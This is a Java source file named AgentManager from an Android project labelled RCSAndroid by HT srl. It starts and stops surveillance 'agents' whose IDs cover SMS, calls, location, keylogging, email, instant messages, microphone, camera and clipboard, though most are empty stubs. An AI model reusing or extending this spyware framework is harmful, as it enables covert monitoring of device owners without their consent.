/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import com.ht.RCSAndroidGUI.Status;

import android.util.Log;

public class AgentManager {
	private static final String TAG = "AgentManager";
	
	private volatile static AgentManager singleton;
	private Status statusObj;
	
	private HashMap<Integer, AgentBase> running;
	
	public static AgentManager self() {
		if (singleton == null) {
			synchronized(AgentManager.class) {
				if (singleton == null) {
                    singleton = new AgentManager();
                }
			}
		}

		return singleton;
	}
	
	private AgentManager() {
		statusObj = Status.self();
		
		running = new HashMap<Integer, AgentBase>();
	}
	
	/**
	 * mapAgent()
	 * Add agent id defined by "key" into the running map. If the agent
	 * is already present, the old object is returned.
	 * 
	 * @param key: Agent ID
	 * @return the requested agent or null in case of error
	 */
	private AgentBase mapAgent(int key) {
		AgentBase a = null;
		
		if (running.containsKey(key) == true) {
			return running.get(key);			
		}
		
		switch (key) {
			case Agent.AGENT_SMS:
				break;
				
			case Agent.AGENT_TASK:
				break;
				
			case Agent.AGENT_CALLLIST:
				break;
				
			case Agent.AGENT_DEVICE:
				a = new DeviceAgent();
				break;
				
			case Agent.AGENT_POSITION:
				break;
				
			case Agent.AGENT_CALL:
				break;
				
			case Agent.AGENT_CALL_LOCAL:
				break;
				
			case Agent.AGENT_KEYLOG:
				break;
				
			case Agent.AGENT_SNAPSHOT:
				a = new SnapshotAgent();
				break;
				
			case Agent.AGENT_URL:
				break;
				
			case Agent.AGENT_IM:
				break;
				
			case Agent.AGENT_EMAIL:
				break;
				
			case Agent.AGENT_MIC:
				break;
				
			case Agent.AGENT_CAM:
				break;
				
			case Agent.AGENT_CLIPBOARD:
				break;
				
			case Agent.AGENT_CRISIS:
				break;
				
			case Agent.AGENT_APPLICATION:
				break;
				
			default:
				break;
		}
		
		if (a != null) {
			running.put(key, a);
		}
		
		return a;
	}
	
	public boolean startAgents() {
		HashMap<Integer, Agent> agents;
		
		agents = statusObj.getAgentsMap();
		
		if (agents == null) {
			Log.d("RCS", "Agents map null");
			return false;
		}
		
		if (running == null) {
			Log.d("RCS", "Running Agents map null");
			return false;
		}
		
		Iterator<Map.Entry<Integer, Agent>> it = agents.entrySet().iterator();

		while (it.hasNext()) {
			Map.Entry<Integer, Agent> pairs = it.next();

			if (pairs.getValue().getStatus() != Agent.AGENT_ENABLED)
				continue;
			
			AgentBase a = mapAgent(pairs.getKey());
			
			if (a != null) {
				a.parse(pairs.getValue().getParams());
				a.start();
			}
		}
		
		return true;
	}
	
	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	public void stopAgents() {
		Iterator<Map.Entry<Integer, AgentBase>> it = running.entrySet().iterator();
		
		while (it.hasNext()) {
			Map.Entry<Integer, AgentBase> pairs = it.next();

			if (pairs.getValue().getStatus() != Agent.AGENT_RUNNING)
				continue;
			
			pairs.getValue().stopThread();
		}	
	}
	
	public synchronized void startAgent(int key) {
		HashMap<Integer, Agent> agents;
		
		agents = statusObj.getAgentsMap();
		
		if (agents == null) {
			Log.d("RCS", "Agents map null");
			return;
		}
		
		if (running == null) {
			Log.d("RCS", "Running Agents map null");
			return;
		}
		
		AgentBase a = mapAgent(key);
		
		if (a == null)
			return;
		
		// Agent mapped and running
		if (a.getStatus() == Agent.AGENT_RUNNING) {
			Log.d("RCS", "Agent " + key + " is already running");
			return;
		}
		
		// start() will NEVER be valid again on a stopped thread
		// so unmap and restart the thread
		if (a.getStatus() == Agent.AGENT_STOPPED) {
			running.remove(key);
			a = mapAgent(key);
		}
		
		if (a != null) {
			a.parse(agents.get(key).getParams());
			a.start();
		}
	}
	
	public synchronized void stopAgent(int key) {
		AgentBase a = running.get(key);
		
		if (a == null) {
			Log.d("RCS", "Agent " + key + " not present");
			return;
		}
		
		a.stopThread();
	}

	public synchronized void restartAgent(int key) {
		AgentBase a = running.get(key);
		stopAgent(key);
		try {
			a.join();
		} catch (InterruptedException e) {
			Log.e(TAG,e.toString());
		}
		startAgent(key);
	}

	public void reloadAgent(int key) {
		AgentBase a = running.get(key);
		a.next();
	}
}
